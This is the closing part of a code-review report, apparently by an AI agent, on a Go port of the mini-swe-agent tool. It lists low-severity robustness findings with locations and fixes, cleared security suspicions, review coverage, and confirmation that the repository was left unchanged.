**Evidence:** CONFIRMED by reading; the rest of the codebase is careful about this (`agent/agent.go:755-761` `oneLine`, `session/jobs.go:363-369` `trunc`, `tpl/tpl.go:89-115` all use `[]rune`), which makes these two the outliers.
**Fix:** Use `oneLine`/`[]rune` in `reportOf`, and in `readJobBody` trim back to the last valid rune boundary (`for read > 0 && !utf8.Valid(buf[:read]) { read-- }`) before appending `(truncated)`.

### [LOW] `HasUndeliveredFiring` reports "already reported" once the queue exceeds its probe window
**Location:** `job/wake.go:69-81` (`PendingJobEvents(32)` then linear scan), `job/wake.go:100-108` (`PendingFirings` caps at 8 and has no production caller)
**Failure mode:** The GUI card's "finished, not yet reported" flag (`cmd/mini/jobs.go:84`) is computed from a 32-row probe of a queue ordered by `id`; a session with more than 32 undelivered firings reports `false` for a job whose result is genuinely still owed, i.e. the human sees a settled card for unreported work. Requires a backlog (a job ending during a long pause/held session), so low impact.
**Evidence:** CONFIRMED by reading; not reproduced (needs >32 queued events).
**Fix:** Give the store an exact predicate — `SELECT count(*) FROM job_events WHERE session_id=? AND job_id=? AND delivered_at IS NULL` — instead of a bounded list scan, and delete `PendingFirings` or make it return the real count via `UndeliveredFirings`.

### [LOW] No bound on streamed content or on tool calls per turn (hostile/buggy server)
**Location:** `model/stream.go:63-65` and `:96-100` (`st.content.WriteString` and `st.mergeToolCall` with no ceiling; only per-line size is capped at 10 MiB), `agent/agent.go:1486` (`for i, action := range actions` executes every action, uncapped)
**Failure mode:** A server that streams without end (or emits N distinct `index` values) grows `st.content`, `st.toolCalls`, and then the number of commands mini will execute in one step, without limit; the same text is pushed to every `Handler.Content` callback, which for the GUI means an ever-growing live card (`ui/fyneview.go:999-1024`) repainting a buffer that never ends. `attempt` holds a gate slot for the whole read (`model/sushi.go:350-372`), so a stalled-but-open stream also parks a concurrency slot indefinitely (there is deliberately no `http.Client.Timeout`).
**Evidence:** SUSPECTED (no exploit run against a hostile server). The per-line cap exists and the error paths are clean; the missing thing is a whole-response cap and an action-count cap. Cancellation does reach the read (`req.WithContext` + `res.Body.Close` defer), so a human can escape it.
**Fix:** Cap total streamed bytes/chars in `readStream` (e.g. `MaxViewChars × 4` or the context window) and return a non-retryable `APIError` past it; cap `len(toolCalls)` per turn to something like the job cap and turn the rest into a format error.

### [LOW] `context.AfterFunc` kill path can signal a process group after the child was reaped
**Location:** `env/exec_unix.go:52-62`
**Failure mode:** `stop()` (the AfterFunc handle) cannot cancel a callback that has already begun, so the SIGINT → `Sleep(2s)` → SIGKILL sequence on `-pgid` can run after `cmd.Wait()` returned and the group leader is gone. If a grandchild survives in that group the signal is *desirable*; if the pid has been recycled into an unrelated process group, mini signals something it never started — the one thing invariant 3 promises not to do. Requires losing a pid-reuse race within a ~2 s window; macOS PIDs are not aggressively recycled, so this is theoretical.
**Evidence:** SUSPECTED (reasoning only, no repro).
**Fix:** Track a per-run "settled" flag set before `Wait` returns and have the AfterFunc check it before each `syscall.Kill`; or send the signals only while `cmd.ProcessState` is nil.

### [LOW] `recordExit` dereferences `*row.EndedAt` behind an inconsistent guard
**Location:** `job/local.go:447-456`
**Failure mode:** `elapsed` is computed with `if row.EndedAt != nil` but `FiredAt: *row.EndedAt` is unconditional — a row read back with a NULL `ended_at` panics in the watcher goroutine, killing the process (no recover there). Today unreachable: the only caller passes a `FinishJob` result, whose `UPDATE … SET ended_at = ? RETURNING` cannot yield NULL.
**Evidence:** CONFIRMED as latent (unreachable from current call sites; traced both callers, `job/local.go:256` and `:304`).
**Fix:** `var fired int64 = time.Now().UnixMilli(); if row.EndedAt != nil { fired = *row.EndedAt }` and use `fired`.

## Notes on confirmed-safe suspicions

- **Foreground runs stealing job-cap slots.** `Launch` registers a handle for every call (`job/local.go:163`) and `register`'s cap counts them, while the handle is dropped by a *separate* goroutine parked on `r.done` (`job/job.go:403-410`) — so I expected a step of N sequential commands to spuriously hit the cap. Probe (`/tmp/probe/cap`, 12 back-to-back non-detached launches, cap 3): **0 refusals at both GOMAXPROCS=1 and 4**. The forget-goroutine subscribes to `r.done` before the waiter does, so `close` wakes it first in the channel's sendq, and the loop's DB/observation work between calls yields the P anyway. Real but not reachable as far as I can drive it.
- **`job.Manager.ClaimFirings` is not atomic** (`job/wake.go:35-58`: `PendingJobEvents` then `MarkJobEventsDelivered`, no transaction), which contradicts its own doc that "at-most-once is a property of the queue rather than a protocol between consumers". Cleared for *today*: the only consumer is `Loop.jobWake`, always on the loop's single run goroutine (`agent/agent.go:563`, callers at `:1174/:1193/:1254`). It becomes a double-delivery bug the moment the monitor engine adds a second drainer — worth a comment on the function.
- **Path traversal / SQL injection in the store.** `JobIDPattern` (`session/jobs.go:64`) is enforced on both the filesystem and the row path (`job/local.go:153`, `session/jobs.go:164`); job ids are only ever derived from `tcno` or a UUID (`job/local.go:485-495`). All dynamic SQL is `?`-parameterised — the one interpolated fragment is the `IN (?,?,…)` placeholder list (`session/jobs.go:462-476`), which builds placeholders only. `Store.Delete` correctly relies on `PRAGMA foreign_keys(1)` + `ON DELETE CASCADE` for child rows (`session/store.go:182`, schema) while collecting result dirs first; the stray-dir sweep uses `e.Name()` from a `ReadDir`, not user input.
- **`model.ProjectContext` prefix/duplication.** Beyond the orchestrator's check: the `head+n > len(out)` overlap is prevented by the `n > len(out)-head` clamp (`model/compaction.go:76-78`), projecting a projection is a genuine no-op (a synthesized summary carries `extra`, so `prefixEnd` stops before it and no `compaction` role rows survive into a projection), and `estimateRebuild` re-clamps `head` to `cut` (`agent/compaction.go:325-328`). `ViewStart` (`model/view.go:32-59`) is newline-exact and never splits a rune; `ReadView` (`:140-166`) cannot produce a negative length from any `(offset, end)` the store can record, because both come from one `CompleteToolCall` measurement.
- **HTTP lifecycle.** Both bodies are `defer`-closed with `io.LimitReader` on the error path (orchestrator-confirmed; I re-read `model/sushi.go:350-372`, `:490-506`); the gate's `release` is `sync.Once`-idempotent and cannot double-free a slot (`model/gate.go:113-125`); `ui/askqueue.go:60-81` handles the ownership-vs-cancellation race correctly (the fall-through `<-ticket` is bounded because the releaser has already dequeued and is about to close). No `api_key`/auth header exists anywhere in this port (`grep` empty) so there is no secret in a request; the residual secret risk is that a trajectory file is written `0644` (`agent/agent.go:1683`) with every command's `raw_output` in it.
- **Fyne threading.** All widget work from `Content`/`Reasoning`/`Message`/`Ask` is posted to the toolkit goroutine (`ui/fyneui.go:394-406`, `ui/shell.go:150-155`), the stream buffers are under `g.mu`, and shell-wide UI state (`thinking`) is under `sh.mu` — I could not find an unsynchronized widget or shared-map access on the live-card path.

## Coverage

Read closely: `agent/agent.go` (Run loop, Query, ExecuteActions, runCommand/handoff, jobWake, Serialize/Save), `agent/compaction.go` (all), `model/compaction.go`, `model/view.go`, `model/stream.go`, `model/actions.go`, `model/model.go`, `model/sushi.go` (Query/Summarize/retry/attempt), `model/tools.go`, `model/gate.go`, `job/job.go`, `job/local.go`, `job/wake.go`, `session/jobs.go`, `session/turns.go`, `session/calls.go`, `session/tcr.go`, `session/export.go`, `session/store.go` (Open/schema/Delete/Find/ sweep), `host/host.go`, `host/session.go`, `host/spawn.go`, `env/env.go`, `env/local.go`, `env/exec_unix.go`, `ui/interactive.go`, `ui/askqueue.go`, `ui/transcript.go`, `ui/jobs.go`, `tpl/tpl.go`, `cmd/mini/main.go` (assembly + print path), plus upstream `mini-swe-agent/{agents/default.py,agents/interactive.py}` for divergence comparison.
Skimmed: `ui/fyneui.go`, `ui/fyneview.go` (only the streaming/ask/settle paths), `ui/shell.go`, `ui/prefs.go`, `ui/print.go`, `cmd/mini/{sessions.go,jobs.go,config.go}`, `config/*` (merge/dotenv read, not exercised), `model/info.go`, `model/stats.go`, `env/exec_windows.go`, `ui/blocks.go`, `ui/markdown.go`, `testdata/fakesushi`.
Skipped: all 16k lines of tests except the ones cited, `ui/fyneview.go`'s scroll/layout machinery, `model/info.go`'s context-window table, `env/uname.go`.
Would review next: (1) the whole confirm-gate surface as one testable unit — `ConfigFromMap` validation, `slash` mode transitions, `bubblingHooks`/`childHooks` forwarding, per-UI `Ask` timeouts — since findings 1-2 are both "the gate isn't where you think it is"; (2) `ui/fyneview.go`+`ui/blocks.go` under `-race` with a synthetic multi-session driver, because `ui` was only ever proven clean by tests that don't exercise N live sessions with cards streaming; (3) `model/info.go`'s `DiscoverContextWindow` — a server-controlled number feeds `compactThreshold()` directly, so a tiny reported window plus finding 3 is a startup crash; (4) a real duplicate-`-r` two-process soak to firm up the sweep finding.

Repository is untouched: `git -C /Users/victor/src/llm_stuff/mini status --porcelain` prints nothing (verified, 0 lines). All probes and stores were built under `/tmp` with `MkdirTemp` HOMEs; `~/.mini/sessions.db` gained no rows from this review (the two newest rows are the harness running me).